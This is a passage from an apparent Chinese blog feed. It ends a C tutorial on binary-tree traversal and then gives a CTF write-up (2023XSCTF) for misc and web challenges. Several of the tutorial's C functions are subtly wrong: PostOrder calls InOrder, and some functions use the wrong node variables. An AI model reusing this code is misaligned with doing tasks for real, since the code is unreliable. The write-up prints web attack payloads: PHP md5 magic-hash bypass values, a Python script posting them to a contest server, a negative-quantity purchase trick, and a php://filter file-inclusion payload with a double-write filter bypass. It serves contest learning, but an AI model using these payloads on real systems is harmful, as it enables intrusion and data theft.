class="title">S</span>=</span>CreateStack();</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span> (root)&#123;</span><br><span class="line">            Push(&amp;S,root);</span><br><span class="line">            <span class="comment">//访问左子树，并继续将左子树的根压入栈中</span></span><br><span class="line">            root=root-&gt;left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(IsEmptyStack(S))&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        root= Pop(&amp;S);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,root-&gt;data);<span class="comment">//出栈后，处理当前节点</span></span><br><span class="line">        <span class="comment">//表示左子树，当前节点均处理完毕，现在开始处理右子树。</span></span><br><span class="line">    &#125;</span><br><span class="line">    DeleteStack(&amp;S);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="后序遍历"><a href="#后序遍历" class="headerlink" title="后序遍历"></a>后序遍历</h5><p>后续遍历定义如下：</p><ul><li>遍历左子树</li><li>遍历右子树</li><li>访问根节点</li></ul><p>得到的访问序列为：4,5,2,6,7,3,1。</p><p>递归实现思路一样，代码如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PostOrder</span><span class="params">(<span class="keyword">struct</span> BinaryTreeNode*root)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root)&#123;</span><br><span class="line">        InOrder(root-&gt;left);</span><br><span class="line">        InOrder(root-&gt;right);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,root-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//和前面的思路基本一样</span></span><br></pre></td></tr></table></figure><p>后序遍历采用非递归实现则比较复杂，因为每个节点会被访问两次：在遍历左节点时我们会访问该节点，遍历右节点时会访问该节点。当第二次访问结束时，我们才能处理该节点，那么问题来了，当我们返回到该节点时我们要怎么判断是通过遍历完左子树访问的还是遍历完右子树访问到的呢？</p><p>我们不妨定义一个previous节点和一个current节点，前者用来储存上一个访问的节点，后者则假设是当前的栈顶节点。</p><p>当previous节点是current的parent节点时，我们判断current节点是否存在左子树。如果存在，则继续遍历左子树（即将current的左孩子压入栈）；如果不存在，则判断是否存在右子树；如果不存在右孩子（即为叶子节点），弹出该节点进行处理。</p><p>当previous节点是current的左孩子节点时，说明我们是从处理完左子树返回的该节点。检查该节点是否有右孩子：如果有，则继续遍历右孩子（将右孩子压入栈），否则弹出该数据。</p><p>当previous节点是current的右孩子节点时，说明我们是从处理完右子树返回的该节点，此时可以直接弹出该元素进行处理。</p><p>代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PostOrderNonRecursive</span><span class="params">(<span class="keyword">struct</span> BinaryTreeNode*root)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Stack</span> *<span class="title">S</span>=</span>CreateStack();</span><br><span class="line">    Push(&amp;S,root);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span>*<span class="title">previous</span>=</span><span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span> (!IsEmptyStack(S))&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span> *<span class="title">current</span>=</span>Pop(&amp;S);</span><br><span class="line">        <span class="keyword">if</span>(!previous||previous-&gt;left==current||previous-&gt;right==current)&#123;</span><br><span class="line">            <span class="comment">//如果当前节点为根节点或者previous节点为当前节点的父母节点。</span></span><br><span class="line">            <span class="keyword">if</span>(current-&gt;left)</span><br><span class="line">                Push(&amp;S,root-&gt;left);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(current-&gt;right)</span><br><span class="line">                Push(&amp;S,root-&gt;right);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(current-&gt;left==previous)&#123;</span><br><span class="line">            <span class="comment">//如果是从左节点返回的</span></span><br><span class="line">            <span class="keyword">if</span>(current-&gt;right)<span class="comment">//判断是否存在右孩子</span></span><br><span class="line">                Push(&amp;S,current-&gt;right);</span><br><span class="line">            <span class="keyword">else</span>&#123;<span class="comment">//如果是右节点，直接处理并弹出栈</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,root-&gt;data);</span><br><span class="line">                Pop(&amp;S);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        previous=current;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="层次遍历"><a href="#层次遍历" class="headerlink" title="层次遍历"></a>层次遍历</h5><p>层次遍历定义如下：</p><ul><li>访问根节点</li><li>在遍历l层节点的同时，将l+1层的节点依次插入列中。</li><li>访问下一层的所有节点</li><li>重复上述过程直到所有层上的节点均被访问为止。</li></ul><p>对上图给出的例树进行层次遍历，得到的节点访问序列为：1,2,3,4,5,6,7。</p><p>代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">LevelOrder</span><span class="params">(<span class="keyword">struct</span> BinaryTreeNode*root)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span>*<span class="title">temp</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Queue</span>*<span class="title">Q</span>=</span>CreatQueue();</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    EnQueue(Q,root);</span><br><span class="line">    <span class="keyword">while</span> (!IsEmptyQueue(Q))&#123;</span><br><span class="line">        temp= DeQueue(Q);<span class="comment">//弹出一个节点</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,root-&gt;data);<span class="comment">//处理节点</span></span><br><span class="line">        <span class="comment">//存入下一层节点</span></span><br><span class="line">        <span class="keyword">if</span>(temp-&gt;left)</span><br><span class="line">            EnQueue(Q,temp-&gt;left);</span><br><span class="line">        <span class="keyword">if</span>(temp-&gt;right)</span><br><span class="line">            EnQueue(Q,temp-&gt;right)</span><br><span class="line">    &#125;</span><br><span class="line">    DeleteQueue(Q);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二叉树的问题集"><a href="#二叉树的问题集" class="headerlink" title="二叉树的问题集"></a>二叉树的问题集</h3><p>由于版面限制（懒），就不给出非递归算法的实现了（逃）。</p><h4 id="查找二叉树中的最大元素"><a href="#查找二叉树中的最大元素" class="headerlink" title="查找二叉树中的最大元素"></a>查找二叉树中的最大元素</h4><p>一个简单的思路是分别遍历其左右子树找出两个最大值，然后再比较这两者和根节点，取三者的最大值。借助递归可以很容易的实现算法。</p><p>代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">FindMax</span><span class="params">(<span class="keyword">struct</span> BinaryTreeNode*root)</span>&#123;</span><br><span class="line">    <span class="type">int</span> root_val,left,right,max=INT_MIN;</span><br><span class="line">    <span class="keyword">if</span>(root)&#123;</span><br><span class="line">        root_val=root-&gt;data;</span><br><span class="line">        left= FindMax(root-&gt;left);</span><br><span class="line">        right= FindMax(root-&gt;right);</span><br><span class="line">        <span class="keyword">if</span>(left&gt;right)</span><br><span class="line">            max=left;</span><br><span class="line">        <span class="keyword">else</span> max=right;</span><br><span class="line">        <span class="keyword">if</span>(root_val&gt;max)</span><br><span class="line">            max=root_val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="搜索二叉树中特定的元素"><a href="#搜索二叉树中特定的元素" class="headerlink" title="搜索二叉树中特定的元素"></a>搜索二叉树中特定的元素</h4><p>给定一棵二叉树，判断节点的值是否为检索值，是则返回1，否则一直向下递归检索直到找到为止。</p><p>代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">FindInBinaryTreeUsingRecursion</span><span class="params">(<span class="keyword">struct</span> BinaryTreeNode*root,<span class="type">int</span> data)</span>&#123;</span><br><span class="line">    <span class="type">int</span> temp;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>)<span class="comment">//如果此时根为空就返回0</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;data==data)<span class="comment">//判断是否找到元素</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">       <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="comment">//返回左子树根的值，一直向下检索</span></span><br><span class="line">            temp = FindInBinaryTreeUsingRecursion(root-&gt;left, data);</span><br><span class="line">            <span class="keyword">if</span> (temp != <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> temp;</span><br><span class="line">            <span class="comment">//左子树检索完毕则返回右子树的检索值</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">return</span> (FindInBinaryTreeUsingRecursion(root-&gt;right, data));</span><br><span class="line">        &#125;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="在二叉树中插入元素"><a href="#在二叉树中插入元素" class="headerlink" title="在二叉树中插入元素"></a>在二叉树中插入元素</h4><p>利用层次遍历将节点插入一个无左孩子或右孩子的指针域中。</p><p>代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InsertInBinaryTree</span><span class="params">(<span class="keyword">struct</span> BinaryTreeNode*root,<span class="type">int</span> data)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Queue</span>*<span class="title">Q</span>;</span><span class="comment">//层次遍历储存队列</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span>*<span class="title">temp</span>;</span><span class="comment">//临时节点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span>*<span class="title">newNode</span>;</span><span class="comment">//待插入节点</span></span><br><span class="line">    newNode=(<span class="keyword">struct</span> BinaryTreeNode*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span> (<span class="keyword">struct</span> BinaryTreeNode));</span><br><span class="line">    newNode-&gt;left=newNode-&gt;right=<span class="literal">NULL</span>;<span class="comment">//初始化待插入节点</span></span><br><span class="line">    newNode-&gt;data=data;</span><br><span class="line">    <span class="keyword">if</span>(newNode==<span class="literal">NULL</span>)&#123;<span class="comment">//如果新节点申请错误</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Memory Error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!root)&#123;<span class="comment">//如果树不存在，直接把根节点变成新节点。</span></span><br><span class="line">        root=newNode;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//正式开始准备遍历插入</span></span><br><span class="line">    Q=CreatQueue();</span><br><span class="line">    EnQueue(Q,root);<span class="comment">//将根节点置入队列</span></span><br><span class="line">    <span class="keyword">while</span> (!IsEmptyQueue(Q))&#123;</span><br><span class="line">        temp= DeQueue(Q);</span><br><span class="line">        <span class="keyword">if</span>(temp-&gt;left)</span><br><span class="line">            EnQueue(Q,temp-&gt;left);<span class="comment">//依次遍历节点的所有子树</span></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//如果节点左子树不存在，说明可插入</span></span><br><span class="line">            temp-&gt;left=newNode;</span><br><span class="line">            DeQueue(Q);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(temp-&gt;right)</span><br><span class="line">            EnQueue(Q,temp-&gt;right);</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            temp-&gt;right=newNode;</span><br><span class="line">            DeQueue(Q);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//结合队列先进先出的性质，元素会依次添加到树中</span></span><br><span class="line">    &#125;</span><br><span class="line">    DeleteQueue(Q);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="删除二叉树"><a href="#删除二叉树" class="headerlink" title="删除二叉树"></a>删除二叉树</h4><p>要删除一棵二叉树，在删除它的双亲节点前必须要删干净它的孩子节点，所以采用后续遍历法遍历每一个节点后对它进行删除操作。</p><p>实现代码如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DeleteBinaryTree</span><span class="params">(<span class="keyword">struct</span> BinaryTreeNode*root)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    DeleteBinaryTree(root-&gt;left);</span><br><span class="line">    DeleteBinaryTree(root-&gt;right);</span><br><span class="line">    <span class="built_in">free</span>(root);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>完结！当然也许后续可能会填坑二叉树的其他算法~O(∩_∩)O。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/1ec9d6b3b80ed38cc22ced07ffb1c4c3.jpg"></p>]]></content>
    
    
    <summary type="html">这次我们来聊聊树，这里重点讨论了二叉树的性质。</summary>
    
    
    
    <category term="数据结构学习" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="二叉树" scheme="http://example.com/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    
  </entry>
  
  <entry>
    <title>2023XSCTF初赛部分WP</title>
    <link href="http://example.com/2023/10/18/2023XSCTF%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86WP/"/>
    <id>http://example.com/2023/10/18/2023XSCTF%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86WP/</id>
    <published>2023-10-17T16:05:22.000Z</published>
    <updated>2023-10-19T14:07:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>献给，【打舞萌打的】。</p><p>第一次写wp，如有纰漏，还请多多见谅。</p><hr><h1 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Mommy-Kafka"><a href="#Mommy-Kafka" class="headerlink" title="Mommy_Kafka"></a>Mommy_Kafka</h3><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014205025943.png" alt="image-20231014205025943"></p><p>下载压缩包，解压。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014205105049.png" alt="image-20231014205105049"></p><p>发现有密码，但是题目没有给出任何和密码的信息。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014205243055.png" alt="image-20231014205243055"></p><p>压缩包内没有注释，于是考虑是伪加密。</p><p>用010Editor打开。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014205505932.png" alt="image-20231014205505932"></p><p>文件开头是PK，的确是一个压缩包，但是压缩文件数据区全局方式位标记为00 00，说明是没有加密的，那么本题一定是修改了压缩文件目录区的全局方式标记。搜索504B0102找到压缩文件目录区。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014205735170.png" alt="image-20231014205735170"></p><p>果然被修改过，将09 00改为00 00。保存，重新解压压缩包。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014205844632.png" alt="image-20231014205844632"></p><p>解压成功。</p><p>查看图片</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014205917775.png" alt="image-20231014205917775"></p><p>没有任何信息提示，考虑lsb隐写也没有找到有效信息。用010editor打开查看是否有其他信息隐藏在文件中。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014210045282.png" alt="image-20231014210045282"></p><p>发现文件末尾有隐藏信息，疑似base64加密。</p><p>丢进base解密脚本。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014210152273.png" alt="image-20231014210152273"></p><p>得到hint，使用steghide。</p><p>steghide是一款图片隐写软件，也可以反向解密出图片隐藏的信息，但是需要提供该图片加密时使用的密码。steghide虽然可以解密，但是没有提供爆破功能，所以需要使用脚本和自带字典或者第三方工具。</p><p>这里使用stegseek，需要在linux系统上运行，工具地址：<a href="https://github.com/RickdeJager/stegseek">RickdeJager&#x2F;stegseek: :zap: Worlds fastest steghide cracker, chewing through millions of passwords per second :zap: (github.com)</a></p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014210438034.png" alt="image-20231014210438034"></p><p>爆破得到flag。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/3dc0ddaedf89a8baebc5b0bee200832.png" alt="3dc0ddaedf89a8baebc5b0bee200832"></p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/aae182042b7630f38d57cdfbef07933.png" alt="aae182042b7630f38d57cdfbef07933"></p><p>flag为<code>XSCTF&#123;M0mmy_L0v3_Me_th3_mo5t&#125;</code></p><h3 id="Oursecret-for-zero"><a href="#Oursecret-for-zero" class="headerlink" title="Oursecret_for_zero"></a>Oursecret_for_zero</h3><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015005909159.png" alt="image-20231015005909159"></p><p>下载附件，打开得到一个图片和txt文本文件。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015005951989.png" alt="image-20231015005951989"></p><p>图片看似是一张普通的图片，其实是后面我们会用到的神奇妙妙工具。先看password.txt。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015010124395.png" alt="image-20231015010124395"></p><p>确实很奇怪，这时候结合题目hint和信息，搜索零宽隐写，得到一个解密网站<a href="https://330k.github.io/misc_tools/unicode_steganography.html">Unicode Steganography with Zero-Width Characters (330k.github.io)</a>。放入信息解密。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015010531120.png" alt="image-20231015010531120"></p><p>得到hint：<code>Here is your passwd:A_n3w_ste9_way</code>。明显是有一个需要密钥的图片隐写在里面。</p><p>一开始我以为又是steghide，但是解析不出来，所以又回到题目。题目提示大写了OURSECRET，于是百度之。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015010709588.png" alt="image-20231015010709588"></p><p>还真有这么个工具。于是下载好之后把图片拖进去输入密码后就可得到flag。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015010818291.png" alt="image-20231015010818291"></p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015010831232.png" alt="image-20231015010831232"></p><p>flag为：<code>XSCTF&#123;WeLc0m3_to_s7eg_w0rld&#125;</code>。</p><h3 id="0xf-and-0xf"><a href="#0xf-and-0xf" class="headerlink" title="0xf and 0xf"></a>0xf and 0xf</h3><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231016133103503.png" alt="image-20231016133103503"></p><p>下载附件，打开是一个加密编码的文本文件。</p><p>结合hint和题目名。两个0xf，就是两个十六进制。</p><p>搜索双十六进制解码</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231016133316939.png" alt="image-20231016133316939"></p><p>进入解密网站<a href="https://www.calcresult.com/misc/cyphers/twin-hex.html">Twin-Hex Cypher encoder and decoder from CalcResult Universal Calculators</a>解密两次得到flag。（藏得太深了，受不了）</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231016133552996.png" alt="image-20231016133552996" style="zoom:50%;" /><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231016133605957.png" alt="image-20231016133605957" style="zoom:50%;" /><p>flag为<code>XSCTF&#123;Cs3ome_13_pwn_k1ng&#125;</code>。</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Hacker"><a href="#Hacker" class="headerlink" title="Hacker"></a>Hacker</h3><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014210609801.png" alt="image-20231014210609801"></p><p>进入网页</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014210630674.png" alt="image-20231014210630674"></p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014210637117.png" alt="image-20231014210637117"></p><p>查看页面源代码。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014211006246.png" alt="image-20231014211006246"></p><p>发现flag<code>XSCTF&#123;Y0u_can_no7_f1nd_m3_?&#125;</code>。</p><h3 id="ezgame"><a href="#ezgame" class="headerlink" title="ezgame"></a>ezgame</h3><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014211056423.png" alt="image-20231014211056423"></p><p>进入网站。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014211121346.png" alt="image-20231014211121346"></p><p>是一个部署在前端的小游戏，所以不用抓包，一般使用开发者模式在本地修改JS代码来达到目的。</p><p>总之先对JS代码进行审计，但是右键被禁用，应该是JS禁止了这个行为。所以用Ctrl+U打开页面源代码。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014211358956.png" alt="image-20231014211358956"></p><p>对其中的JS文件进行审计，搜索敏感词score。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014211515918.png" alt="image-20231014211515918"></p><p>太多了，搜索highscore。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014211549074.png" alt="image-20231014211549074"></p><p>发现敏感代码，在最高分大于1000000时执行。查看decryptString函数。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014211631163.png" alt="image-20231014211631163"></p><p>在Python中复现解密脚本，解出flag。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014211728402.png" alt="image-20231014211728402"></p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014211736172.png" alt="image-20231014211736172"></p><p>flag为<code>flag&#123;basju_D0G006706_iajdisaia&#125;</code>。</p><h3 id="canyoupassit"><a href="#canyoupassit" class="headerlink" title="canyoupassit"></a>canyoupassit</h3><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014211826174.png" alt="image-20231014211826174"></p><p>进入网站，发现是PHP审计。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014211904126.png" alt="image-20231014211904126"></p><p>主要考察的是PHP下md5函数的特性。</p><p>对于第一关，要求post传参a1和b1不相同但是md5值相同，很经典的md5碰撞问题。我们这里可以MD5碰撞（MD5值以0e开头）也可以用php数组绕过。这里用md5碰撞，取<code>a1=QNKCDZO</code>与&#96;&#96;b1&#x3D;240610708&#96;即可。</p><p>第二关要求post传参key值，使得其与自身md5值碰撞。这里是弱类型比较，本来想用数组绕过，但是网页不知道为什么无回显，于是继续使用0e碰撞，取<code>key=0e215962017</code>。</p><p>第三关要求post传参a2、b2，要求a2、b2不相同，且以$now开头，且两者md5值强相等。这里的$now是当前时间戳。手动传参肯定不行了，于是考虑用Python构造payload传参，脚本如下。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://43.248.97.200:40038/&quot;</span></span><br><span class="line">t=<span class="built_in">str</span>(<span class="built_in">int</span>(time.time()))<span class="comment">#获取当前时间戳</span></span><br><span class="line"><span class="comment">#print(str(t))</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;在a2、b2后加上两个数字使其不相同&#x27;&#x27;&#x27;</span></span><br><span class="line">a2=t+<span class="string">&quot;0&quot;</span></span><br><span class="line">b2=t+<span class="string">&quot;1&quot;</span></span><br><span class="line"><span class="comment">#print(a2,b2)</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;构造payload&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&#x27;a1&#x27;</span>: <span class="string">&#x27;QNKCDZO&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;b1&#x27;</span>: <span class="string">&#x27;240610708&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span>: <span class="string">&#x27;0e215962017&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a2&#x27;</span>: a2,</span><br><span class="line">    <span class="string">&#x27;b2&#x27;</span>: b2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, data=payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p>值得一提的是，本来这里我也打算用a2和b2数组绕过的，但是不知道为什么又没有回显。百无聊赖之际把数组去掉试试，没想到竟然爆了flag，理论上第三个md5函数应该通不过的啊，难道md5函数处理字符数有上限？自动截取了前十个时间戳转换吗。</p><p>总之成功解出flag。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014213426176.png" alt="image-20231014213426176"></p><p>flag为<code>flag&#123;y0v|nDeedReA11yk$nwAb0uTMD5!~_~^_^&#125;</code>。</p><h3 id="reallyExpensive"><a href="#reallyExpensive" class="headerlink" title="reallyExpensive"></a>reallyExpensive</h3><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014213532015.png" alt="image-20231014213532015"></p><p>进入网址</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014213556378.png" alt="image-20231014213556378"></p><p>是一个简陋的登录页面，猜想sql注入或者弱口令，但是先稳一手注册。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014213651989.png" alt="image-20231014213651989"></p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014213704013.png" alt="image-20231014213704013"></p><p>没想到直接进了。</p><p>这里我要严重吐槽一下出题人，环境搭的有问题。本题容器在火狐上打开有bug。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/2ffc2683318716e5b583bcdf84a3062.png" alt="2ffc2683318716e5b583bcdf84a3062"></p><p>然后我偏偏hackbar和bp都配在火狐上，导致我死活进不去抓包，浪费了起码几个小时。最后用bp自带的浏览器打开，进入抓包。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014214206343.png" alt="image-20231014214206343"></p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014214226792.png" alt="image-20231014214226792"></p><p>这里post了两个参数number和goodId，很容易联想到后端的计算方法应该是用金额数减去数量乘以价格来判断是否购买成功，于是修改number为负数，就可以购买flag5了。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014214350464.png" alt="image-20231014214350464"></p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014214424659.png" alt="image-20231014214424659"></p><p>得到flag，且余额增加了999999999，验证了我之前的猜想。</p><p>flag为<code>flag&#123;^==^Y0uG@t$(t]$[r)^u^(e)-F10g!^&lt;&gt;^&#125;</code>。</p><h3 id="Badbad-filename"><a href="#Badbad-filename" class="headerlink" title="Badbad_filename"></a>Badbad_filename</h3><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014214539599.png" alt="image-20231014214539599"></p><p>进入容器</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014215023822.png" alt="image-20231014215023822"></p><p>题目暗示很明显，用get传参filename，然后后者会被文件包含，经典的文件包含漏洞题，联想到使用PHP伪协议，于是构造payload为<code>/?filename=php://filter/convert.base64-encode/resource=index.php</code></p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014215306191.png" alt="image-20231014215306191"></p><p>被过滤了，但是只是单纯的从语句中去掉了过滤词，使用双写绕过。</p><p>构造payload<code>/?filename=pphphphpp://filtfilterer/convert.babasese64-encode/resource=index.pphphphpp</code>。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014215428340.png" alt="image-20231014215428340"></p><p>payload有效，得到index.php的源代码，送进CyberChef解密。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014215521978.png" 